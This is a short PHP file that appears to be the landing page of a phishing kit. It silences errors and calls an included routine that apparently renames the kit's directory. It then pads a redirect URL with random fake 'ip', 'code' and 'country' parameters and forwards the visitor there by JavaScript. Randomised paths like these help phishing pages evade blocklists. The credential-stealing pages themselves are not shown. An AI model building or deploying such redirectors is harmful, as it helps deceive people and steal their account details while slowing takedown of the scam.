<?php
error_reporting(0);
//---------------------------------------------------------------------------------------- INC
	include('./INC/funciones.php');
	
//---------------------------------------------------------------------------------------- VAR
	$An = 'id='.rand(99, 100000000);
	$xcod = 'ip='.rand(100000000, 900000000). 'code='.rand(100000000, 900000000).'&';
	$xbla =  '&country='.rand(100000000, 900000000);
//---------------------------------------------------------------------------------------- RNM
	Badal_smiya();
//---------------------------------------------------------------------------------------- FIN





?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<script language="javascript">
var sirawdi = "./<?php echo Jib_milaf().$xcod.$An.$xbla ; ?>"        
top.location = sirawdi;
</script> 
</head>
</html>